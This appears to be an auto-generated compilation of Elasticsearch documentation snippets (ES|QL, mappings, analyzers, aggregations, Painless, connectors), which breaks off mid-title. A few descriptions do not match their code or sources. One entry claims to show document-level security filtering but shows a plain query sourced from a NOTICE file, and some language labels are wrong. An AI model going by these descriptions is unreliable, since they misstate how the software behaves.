https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/row.csv-spec/example.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 1, b = \"two\", c = null\n```\n\n----------------------------------------\n\nTITLE: Creating and Using Byte Rank Vectors in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a rank_vectors field using byte elements and inserting a document with multiple vectors. The element_type parameter is set to byte for integer value storage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-vectors.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-rank-vectors-byte\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"rank_vectors\",\n        \"element_type\": \"byte\"\n      }\n    }\n  }\n}\n\nPUT my-rank-vectors-byte/_doc/1\n{\n  \"my_vector\" : [[1, 2, 3], [4, 5, 6]]\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-level Nested Index Setup\nDESCRIPTION: The snippet explains the setup of a multi-level nested index in Elasticsearch, demonstrating the definition of nested fields 'make' and 'model' within the parent 'driver' object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /drivers\n{\n  \"mappings\": {\n    \"properties\": {\n      \"driver\": {\n        \"type\": \"nested\",\n        \"properties\": {\n          \"last_name\": {\n            \"type\": \"text\"\n          },\n          \"vehicle\": {\n            \"type\": \"nested\",\n            \"properties\": {\n              \"make\": {\n                \"type\": \"text\"\n              },\n              \"model\": {\n                \"type\": \"text\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monthly Sales Stats Bucket Aggregation Example\nDESCRIPTION: Demonstrates a complete example of stats bucket aggregation calculating statistics across monthly sales data. Uses date_histogram and sum aggregations with stats_bucket to compute statistics over the monthly sales values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-stats-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"stats_monthly_sales\": {\n      \"stats_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Case-Insensitive Elision Filter\nDESCRIPTION: Example of creating a custom case-insensitive elision filter with specific articles to remove.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-elision-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /elision_case_insensitive_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"default\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"elision_case_insensitive\" ]\n        }\n      },\n      \"filter\": {\n        \"elision_case_insensitive\": {\n          \"type\": \"elision\",\n          \"articles\": [ \"l\", \"m\", \"t\", \"qu\", \"n\", \"s\", \"j\" ],\n          \"articles_case\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Documentation Block for MV_DEDUPE Function\nDESCRIPTION: Documentation block explaining the MV_DEDUPE function's purpose of removing duplicate values from multivalued fields, with a note that the function may or may not sort the values in the process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_dedupe.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nRemove duplicate values from a multivalued field.\n\n::::{note}\n`MV_DEDUPE` may, but won't always, sort the values in the column.\n::::\n```\n\n----------------------------------------\n\nTITLE: Basic MIN Function Usage in ESQL\nDESCRIPTION: Demonstrates the basic usage of MIN function to find the minimum value in a column named 'languages'. This query returns the smallest value from the 'languages' column across all records in the 'employees' index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/min.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MIN(languages)\n```\n\n----------------------------------------\n\nTITLE: Sorting and Transforming Employee Data with ESQL\nDESCRIPTION: ESQL query that sorts employees by emp_no, selects specific columns (first_name, last_name, height), and converts height measurements from meters to feet using a multiplication factor of 3.281.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/eval.csv-spec/evalReplace.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| SORT emp_no\n| KEEP first_name, last_name, height\n| EVAL height = height * 3.281\n```\n\n----------------------------------------\n\nTITLE: Creating MySQL Connector Using Elasticsearch API\nDESCRIPTION: Example of creating a new MySQL connector using the Elasticsearch Create connector API. This snippet demonstrates how to specify the index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _connector/my-mysql-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from MySQL\",\n  \"service_type\": \"mysql\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Notion Connector using Elasticsearch API\nDESCRIPTION: Example of creating a new self-managed Notion connector using the Elasticsearch Create connector API. This snippet demonstrates how to specify the index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-notion-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Notion\",\n  \"service_type\": \"notion\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom N-gram Tokenizer in Elasticsearch\nDESCRIPTION: This example shows how to create a custom index with a configured N-gram tokenizer. It sets up an analyzer that produces tri-grams and only considers letters and digits as tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-ngram-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"ngram\",\n          \"min_gram\": 3,\n          \"max_gram\": 3,\n          \"token_chars\": [\n            \"letter\",\n            \"digit\"\n          ]\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"2 Quick Foxes.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ Qui, uic, ick, Fox, oxe, xes ]\n```\n\n----------------------------------------\n\nTITLE: Profiling DFS Phase in Elasticsearch (Console)\nDESCRIPTION: Executes a search query with DFS (Distributed Frequency Search) and profiling enabled to analyze the DFS phase. The query searches for documents with a specific keyword value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET /my-dfs-index/_search?search_type=dfs_query_then_fetch&pretty&size=0\n{\n  \"profile\": true,\n  \"query\": {\n    \"term\": {\n      \"my-keyword\": {\n        \"value\": \"a\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Standard Tokenizer with Custom max_token_length in Elasticsearch\nDESCRIPTION: This example shows how to configure the standard tokenizer with a custom max_token_length of 5. It includes the index creation with custom analyzer and tokenizer settings, followed by an analysis request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-standard-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"standard\",\n          \"max_token_length\": 5\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ The, 2, QUICK, Brown, Foxes, jumpe, d, over, the, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Parsing Log Data with GROK and Transforming Fields in ESQL\nDESCRIPTION: This ESQL query takes a log-like string, uses GROK to extract fields, keeps specific columns, and converts the date field to a datetime type. It demonstrates pattern matching, field selection, and data type conversion in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/grokWithToDatetime.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num:int}\"\"\"\n| KEEP date, ip, email, num\n| EVAL date = TO_DATETIME(date)\n```\n\n----------------------------------------\n\nTITLE: Configuring Synonym Filter with Inline Synonyms in Elasticsearch\nDESCRIPTION: Example of configuring a synonym filter with inline synonyms. The 'synonyms' option allows direct definition of synonym rules within the configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym\",\n      \"synonyms\": [\"pc => personal computer\", \"computer, pc, laptop\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Foreach Processor for Nested Object Fields\nDESCRIPTION: Configuration of the Foreach processor that uppercases the display_name field in each nested object within the products field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foreach\": {\n    \"field\": \"products\",\n    \"processor\": {\n      \"uppercase\": {\n        \"field\": \"_ingest._value.display_name\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Source Index in Elasticsearch\nDESCRIPTION: This snippet demonstrates creating a source index with specific settings and mappings that will be used as a template for other indices. The index has 3 shards, a write block, and defines a text field called 'field1'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/create-index-from-source.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index\n{\n  \"settings\": {\n    \"index\": {\n      \"number_of_shards\": 3,\n      \"blocks.write\": true\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n        \"field1\": { \"type\": \"text\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GROK with Multi-valued Column in ESQL\nDESCRIPTION: Shows how GROK handles multiple occurrences of the same field name, creating a multi-valued column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_16\n\nLANGUAGE: esql\nCODE:\n```\nFROM addresses\n| KEEP city.name, zip_code\n| GROK zip_code \"\"\"%{WORD:zip_parts} %{WORD:zip_parts}\"\"\"\n```\n\n----------------------------------------\n\nTITLE: RRF Retriever Query with Term Aggregation\nDESCRIPTION: Example query using RRF retriever with multiple sub-retrievers and a terms aggregation on termA field. Demonstrates how to combine standard retrievers with different queries and apply aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    \"retriever\": {\n        \"rrf\": {\n            \"retrievers\": [\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"term\": {\n                                \"termB\": \"bar\"\n                            }\n                        }\n                    }\n                },\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"match_all\": { }\n                        }\n                    }\n                }\n            ],\n            \"rank_window_size\": 1\n        }\n    },\n    \"size\": 1,\n    \"aggs\": {\n        \"termA_agg\": {\n            \"terms\": {\n                \"field\": \"termA\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing a Match Boolean Prefix Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to execute a match_bool_prefix query to search for documents in Elasticsearch that match the input phrase 'quick brown f'. The query analyzes the input terms to generate the underlying boolean structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-bool-prefix-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"GET /_search\\n{\\n  \\\"query\\\": {\\n    \\\"match_bool_prefix\\\" : {\\n      \\\"message\\\" : \\\"quick brown f\\\"\\n    }\\n  }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Extracting Substring from Last Name using ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of the SUBSTRING function to extract the first three characters from the 'last_name' field of employees. It keeps only the 'last_name' field and creates a new field 'ln_sub' with the substring result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/substring.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_sub = SUBSTRING(last_name, 1, 3)\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon Geometry using WKT in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Polygon geometry specified in Well-Known Text (WKT) format. The polygon is defined by five points forming a closed shape, with the first and last points being identical.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POLYGON ((100.0 0.0, 101.0 0.0, 101.0 1.0, 100.0 1.0, 100.0 0.0))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Datetime Differences with Painless\nDESCRIPTION: This snippet demonstrates how to calculate the difference between two numeric datetimes and two complex ZonedDateTime objects using Painless scripting. The code uses simple arithmetic for numeric datetimes and ChronoUnit for complex datetimes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_14\n\nLANGUAGE: painless\nCODE:\n```\nlong startTimestamp = 434931327000L;\nlong endTimestamp = 434931330000L;\nlong differenceInMillis = endTimestamp - startTimestamp;\n```\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt1 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 11000000, ZoneId.of('Z'));\nZonedDateTime zdt2 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 35, 0, ZoneId.of('Z'));\nlong differenceInMillis = ChronoUnit.MILLIS.between(zdt1, zdt2);\n```\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt1 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 11000000, ZoneId.of('Z'));\nZonedDateTime zdt2 =\n        ZonedDateTime.of(1983, 10, 17, 22, 15, 35, 0, ZoneId.of('Z'));\nlong differenceInDays = ChronoUnit.DAYS.between(zdt1, zdt2);\n```\n\n----------------------------------------\n\nTITLE: Script-based Value Count Aggregation in Elasticsearch\nDESCRIPTION: Shows how to use a runtime field with a script to perform a more complex value count aggregation. The script emits values based on the 'type' field and a condition on the 'promoted' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-valuecount-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"tags\": {\n      \"type\": \"keyword\",\n      \"script\": \"\"\"\n        emit(doc['type'].value);\n        if (doc['promoted'].value) {\n          emit('hot');\n        }\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"tags_count\": {\n      \"value_count\": {\n        \"field\": \"tags\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Stop Analyzer in Elasticsearch\nDESCRIPTION: This example shows how to configure a custom stop analyzer with a specified list of stop words. It includes the index creation with custom settings and an example of using the custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_stop_analyzer\": {\n          \"type\": \"stop\",\n          \"stopwords\": [\"the\", \"over\"]\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_stop_analyzer\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ quick, brown, foxes, jumped, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: Disabling Source in Elasticsearch Search Response\nDESCRIPTION: Example of using the _source parameter set to false to exclude the document source from the search response, which can reduce response size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"_source\": false,\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Authorization Flow with Document-level Security Filtering\nDESCRIPTION: Demonstration of how document-level security filtering works in Elasticsearch. This example shows how a query for documents is modified to add security filters based on user permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/protobuf-java-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nGET /my_index/_search\n{\n  \"query\": {\n    \"match\": {\n      \"title\": \"foo\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Microsoft SQL Connector Using API\nDESCRIPTION: This code snippet demonstrates how to create a new Microsoft SQL connector using the Elastic REST API. The snippet includes the necessary parameters for the connector such as 'index_name', 'name', and 'service_type'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"PUT _connector/my-mssql-connector\\n{\\n  \\\"index_name\\\": \\\"my-elasticsearch-index\\\",\\n  \\\"name\\\": \\\"Content synced from Microsoft SQL\\\",\\n  \\\"service_type\\\": \\\"mssql\\\"\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Boolean Compound Assignment Examples\nDESCRIPTION: Shows compound assignments using boolean operators including AND, XOR, and OR operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\nboolean b = true;\nb &= false;\nb ^= false;\nb |= true;\n```\n\n----------------------------------------\n\nTITLE: Basic Range Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates how to use the range aggregation to bucket documents based on specified price ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"aggs\": {\n    \"price_ranges\": {\n      \"range\": {\n        \"field\": \"price\",\n        \"ranges\": [\n          { \"to\": 100.0 },\n          { \"from\": 100.0, \"to\": 200.0 },\n          { \"from\": 200.0 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic CASE Expression in SQL\nDESCRIPTION: Demonstrates the basic CASE expression syntax for conditional logic with multiple WHEN clauses. Returns one of multiple possible results based on boolean conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCASE WHEN condition THEN result\n    [WHEN ...]\n    [ELSE default_result]\nEND\n```\n\n----------------------------------------\n\nTITLE: Parameterized Time Spans with DATE_TRUNC in ESQL\nDESCRIPTION: Shows how to use parameterized time spans with the DATE_TRUNC function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nPOST /_query\n{\n   \"query\": \"\"\"\n   FROM employees\n   | KEEP first_name, last_name, hire_date\n   | EVAL year_hired = DATE_TRUNC(?timespan, hire_date)\n   \"\"\",\n   \"params\": [{\"timespan\" : \"1 year\"}]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Mappings with Join Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with mappings that include a join field to establish parent-child relationships between questions and answers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-children-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT child_example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"join\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"question\": \"answer\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NoSuchMethodException in Java\nDESCRIPTION: This snippet defines the java.lang.NoSuchMethodException class, thrown if an application tries to call a method of an object, but the object does not have a method with the specified name. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_44\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.NoSuchMethodException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Docker Deployment Command for PostgreSQL Connector\nDESCRIPTION: Docker command for running the Elastic Connectors service with a mounted configuration volume\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Setting Remote Cluster Port in Elasticsearch YAML\nDESCRIPTION: Specifies the port for remote cluster client communication. Accepts a single value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nremote_cluster.port: 9443\n```\n\n----------------------------------------\n\nTITLE: Initializing Empty Map in Painless\nDESCRIPTION: Demonstrates how to initialize an empty Map using the map initialization operator in Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_12\n\nLANGUAGE: painless\nCODE:\n```\nMap empty = [:]; \n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL String Splitting Function Parameters in Markdown\nDESCRIPTION: This snippet describes the parameters for an ESQL function that splits a string. It specifies the input string and delimiter parameters, noting that only single-byte delimiters are currently supported.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/split.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   String expression. If `null`, the function returns `null`.\n\n`delim`\n:   Delimiter. Only single byte delimiters are currently supported.\n```\n\n----------------------------------------\n\nTITLE: String Handling in EQL\nDESCRIPTION: Examples of string usage in EQL, including escape characters and raw strings. Shows how to include special characters and Unicode in strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_10\n\nLANGUAGE: eql\nCODE:\n```\n\"hello world\"\n```\n\nLANGUAGE: eql\nCODE:\n```\n\"example \\r of \\\" escaped \\n characters\"\n```\n\nLANGUAGE: eql\nCODE:\n```\n\"\"\"Raw string with a literal double quote \" and blackslash \\ included\"\"\"\n```\n\nLANGUAGE: eql\nCODE:\n```\n\"String containing \\\"\\\"\\\" three double quotes\"\n```\n\n----------------------------------------\n\nTITLE: Applying Allocation Filter for Node Migration\nDESCRIPTION: Elasticsearch API call to apply an allocation filter, excluding a specific node from shard allocation. This is part of the process for migrating away from multiple data paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPUT _cluster/settings\n{\n  \"persistent\": {\n    \"cluster.routing.allocation.exclude._name\": \"target-node-name\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Support Matrix\nDESCRIPTION: Markdown table showing supported type combinations for operations between different numeric types. Documents which type combinations result in which output types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/mul.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | integer |\n| integer | long | long |\n| long | double | double |\n| long | integer | long |\n| long | long | long |\n| unsigned_long | unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Testing ESQL Coalesce Function with Various Input Types\nDESCRIPTION: This SQL snippet demonstrates the usage of the COALESCE function with different data types and null values. It tests the function's behavior with integers, strings, and null inputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/coalesce.md#2025-04-21_snippet_0\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT\n    COALESCE(null, 1, 2) AS result,\n    COALESCE(null, null, 3) AS result,\n    COALESCE(1, null, 2) AS result,\n    COALESCE(null, 'a', 'b') AS result,\n    COALESCE('a', null, 'b') AS result,\n    COALESCE(null, null, null) AS result;\n```\n\n----------------------------------------\n\nTITLE: Formatting to Custom Format\nDESCRIPTION: Shows how to format a ZonedDateTime to a custom string format using a custom DateTimeFormatter pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\n        \"'date:' yyyy/MM/dd 'time:' HH:mm:ss\");\nString datetime = zdt.format(dtf);\n```\n\n----------------------------------------\n\nTITLE: SQL Example of VAR_SAMP with Calculated Field\nDESCRIPTION: This example shows VAR_SAMP being used with a calculated field (salary / 24.0). It computes the minimum, maximum, and sample variance of half-monthly salaries from the 'emp' table. The result presents these calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_26\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary / 24.0) AS min, MAX(salary / 24.0) AS max, VAR_SAMP(salary / 24.0) AS varsamp FROM emp;\n\n       min        |       max        |     varsamp\n------------------+------------------+----------------\n1055.1666666666667|3124.9583333333335|332278.830154847\n```\n```\n\n----------------------------------------\n\nTITLE: Customizing Truncate Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom truncate filter that shortens tokens to a length of 5 or fewer characters and incorporates it into a custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-truncate-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT 5_char_words_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"lowercase_5_char\": {\n          \"tokenizer\": \"lowercase\",\n          \"filter\": [ \"5_char_trunc\" ]\n        }\n      },\n      \"filter\": {\n        \"5_char_trunc\": {\n          \"type\": \"truncate\",\n          \"length\": 5\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Read Only ILM Policy in Elasticsearch\nDESCRIPTION: Example of creating an ILM policy that sets an index to read-only during its warm phase. The policy uses the readonly action which requires no additional configuration options. This action prevents any write operations to the index once activated.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-readonly.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"readonly\" : { }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Repeat 